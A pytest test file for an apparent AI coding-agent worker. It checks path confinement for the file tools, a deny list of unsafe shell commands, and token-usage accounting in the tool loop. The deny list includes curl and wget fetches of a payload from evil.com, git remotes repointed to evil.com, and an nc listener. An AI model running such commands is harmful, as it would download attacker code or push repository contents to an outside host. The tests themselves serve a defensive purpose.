import json
import os
import subprocess
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from app.executors.openrouter_worker import (
    OpenRouterWorker,
    read_file,
    write_file,
    search_files,
    run_process,
)


@pytest.fixture
def repo(tmp_path):
    r = tmp_path / "repo"
    r.mkdir()
    (r / "file.txt").write_text("hello world", encoding="utf-8")
    (r / ".git").mkdir()
    (r / ".git" / "config").write_text("git config", encoding="utf-8")
    return r


def test_read_file_confined(repo):
    # Valid read inside repository
    assert read_file(repo, "file.txt") == "hello world"

    # Reject absolute path
    res = read_file(repo, "/etc/passwd")
    assert "error" in res.lower() or "rejected" in res.lower()

    # Reject parent traversal escape
    res = read_file(repo, "../outside.txt")
    assert "error" in res.lower() or "rejected" in res.lower()

    # Reject symlink pointing outside repo
    outside_file = repo.parent / "secret.txt"
    outside_file.write_text("secret content", encoding="utf-8")
    symlink_file = repo / "sym_outside.txt"
    os.symlink(outside_file, symlink_file)
    res = read_file(repo, "sym_outside.txt")
    assert "error" in res.lower() or "rejected" in res.lower()


def test_write_file_confined(repo):
    # Valid write inside repository
    res = write_file(repo, "new_sub/test.txt", "new content")
    assert (repo / "new_sub" / "test.txt").read_text(encoding="utf-8") == "new content"

    # Reject write outside repository
    res = write_file(repo, "../escape.txt", "bad")
    assert "error" in res.lower() or "rejected" in res.lower()
    assert not (repo.parent / "escape.txt").exists()

    # Reject write to .git
    res = write_file(repo, ".git/hooks/pre-commit", "bad")
    assert "error" in res.lower() or "rejected" in res.lower()

    # Reject write through symlink pointing outside repo
    outside_dir = repo.parent / "outside_dir"
    outside_dir.mkdir()
    symlink_dir = repo / "sym_dir"
    os.symlink(outside_dir, symlink_dir)
    res = write_file(repo, "sym_dir/hacked.txt", "bad")
    assert "error" in res.lower() or "rejected" in res.lower()
    assert not (outside_dir / "hacked.txt").exists()


def test_search_files_confined(repo):
    (repo / "sub").mkdir()
    (repo / "sub" / "other.txt").write_text("world pattern", encoding="utf-8")
    res = search_files(repo, "world")
    assert "file.txt" in res
    assert "sub/other.txt" in res

    # Escaping path search rejected
    res = search_files(repo, "world", path="../")
    assert "error" in res.lower() or "rejected" in res.lower()


@pytest.mark.parametrize("cmd", [
    "git push origin main",
    "git push",
    "git remote add origin http://evil.com",
    "git remote set-url origin http://evil.com",
    "gh auth login",
    "sudo apt install",
    "systemctl restart service",
    "service nginx restart",
    "ssh user@remote",
    "scp file remote:",
    "curl -O http://evil.com/payload",
    "wget http://evil.com/payload",
    "nc -l 8080",
    "docker run ubuntu",
    "kubectl get pods",
    "terraform apply",
])
def test_process_tool_rejects_unsafe_commands(repo, cmd):
    res = run_process(repo, cmd, task="normal task")
    assert "rejected" in res.lower() or "not permitted" in res.lower() or "forbidden" in res.lower()


def test_process_tool_git_commit_constraints(repo):
    # When task does NOT ask for commit
    res = run_process(repo, "git commit -m 'msg'", task="just fix bug")
    assert "rejected" in res.lower() or "permitted only" in res.lower()

    # When task asks for commit
    task = "Fix the bug and commit your changes"
    # git status is allowed
    status_res = run_process(repo, "git status", task=task)
    assert "rejected" not in status_res.lower()

    # git diff is allowed
    diff_res = run_process(repo, "git diff", task=task)
    assert "rejected" not in diff_res.lower()


def test_openrouter_worker_tool_loop_and_usage_aggregation(repo):
    worker = OpenRouterWorker(
        repo_root=repo,
        model="deepseek/deepseek-v4-flash-0731",
        api_key="test-api-key",
        base_url="https://openrouter.ai/api/v1",
        task="write greeting and commit",
        task_kind="implementation",
    )

    # Turn 1: model calls write_file
    turn_1_resp = {
        "id": "gen-1",
        "choices": [{
            "finish_reason": "tool_calls",
            "message": {
                "role": "assistant",
                "content": None,
                "tool_calls": [{
                    "id": "call_1",
                    "type": "function",
                    "function": {
                        "name": "write_file",
                        "arguments": json.dumps({"path": "greeting.txt", "content": "Hello!"})
                    }
                }]
            }
        }],
        "usage": {
            "prompt_tokens": 50,
            "completion_tokens": 20,
            "total_tokens": 70,
            "cost": 0.0005,
        }
    }

    # Turn 2: model returns final response
    turn_2_resp = {
        "id": "gen-2",
        "choices": [{
            "finish_reason": "stop",
            "message": {
                "role": "assistant",
                "content": "I have created greeting.txt with Hello!",
            }
        }],
        "usage": {
            "prompt_tokens": 60,
            "completion_tokens": 15,
            "total_tokens": 75,
            "cost": 0.0006,
        }
    }

    call_count = 0
    def fake_post_chat(payload):
        nonlocal call_count
        call_count += 1
        if call_count == 1:
            return turn_1_resp
        return turn_2_resp

    with patch.object(worker, "_post_chat", side_effect=fake_post_chat):
        result = worker.run()

    assert result["status"] == "SUCCESS"
    assert "greeting.txt" in result["response"]
    assert (repo / "greeting.txt").read_text() == "Hello!"
    assert result["usage"]["prompt_tokens"] == 110
    assert result["usage"]["completion_tokens"] == 35
    assert result["usage"]["total_tokens"] == 145
    assert round(result["usage"]["cost"], 4) == 0.0011


def test_openrouter_worker_handles_api_failure(repo):
    worker = OpenRouterWorker(
        repo_root=repo,
        model="deepseek/deepseek-v4-flash-0731",
        api_key="test-api-key",
        task="do something",
    )
    with patch.object(worker, "_post_chat", side_effect=RuntimeError("connection refused")):
        res = worker.run()
    assert res["status"] == "ERROR"
    assert "connection refused" in res["error"]


def test_openrouter_worker_hits_max_turns_limit(repo):
    worker = OpenRouterWorker(
        repo_root=repo,
        model="deepseek/deepseek-v4-flash-0731",
        api_key="test-api-key",
        task="infinite loop",
        max_turns=2,
    )
    # Continually returns tool_calls
    tool_resp = {
        "choices": [{
            "finish_reason": "tool_calls",
            "message": {
                "role": "assistant",
                "tool_calls": [{
                    "id": "call_x",
                    "type": "function",
                    "function": {"name": "read_file", "arguments": '{"path":"file.txt"}'}
                }]
            }
        }],
        "usage": {"prompt_tokens": 10, "completion_tokens": 5, "total_tokens": 15}
    }
    with patch.object(worker, "_post_chat", return_value=tool_resp):
        res = worker.run()
    assert res["status"] == "SUCCESS"
    assert "maximum turns" in res["response"]
    assert res["usage"]["total_tokens"] == 30


def test_process_tool_timeout(repo):
    res = run_process(repo, "sleep 5", task="test", timeout=0.01)
    assert "timed out" in res.lower()
